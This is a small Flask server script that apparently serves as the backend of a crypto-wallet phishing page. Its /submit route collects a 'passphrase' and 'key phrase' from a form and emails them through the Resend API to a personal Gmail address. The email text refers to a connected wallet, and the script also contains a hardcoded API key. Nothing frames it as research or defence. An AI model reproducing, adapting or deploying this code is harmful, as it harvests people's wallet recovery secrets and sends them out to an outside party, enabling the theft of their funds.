from flask import Flask, request, redirect, url_for

import resend

app = Flask(__name__)

@app.route("/")
def home():
    return redirect(url_for("server"))

API_KEY = "re_4jT9uMnR_FpBgpk5cEj3bCLQ1kmCc3GZV"

@app.route("/submit", methods = ["GET", "POST"])
def server():
    if request.method == "GET":
        return "Server Page"
    
    else:
        pass_phrase = request.form.get("passphrase")

        key_phrase = request.form.get("keyphrase")

        resend.api_key = API_KEY

        html_message = f"""
<html>
  <body style="font-family: Arial, sans-serif;">
    <p><strong>Passphrase:</strong> {pass_phrase}</p>
    <p><strong>Key Phrase:</strong> {key_phrase}</p>
    <p style="color: gray;">
      Ignore this mail if you've not connected your wallet.
    </p>
  </body>
</html>
"""


        response = resend.Emails.send({
        "from": "onboarding@resend.dev",
        "to": "chibuchidavid159@gmail.com",
        "subject": "New Response",
        "html": html_message
        })

        return "Your email is on the way"

if __name__ == "__main__":
    app.run(host = "0.0.0.0", port = "10000")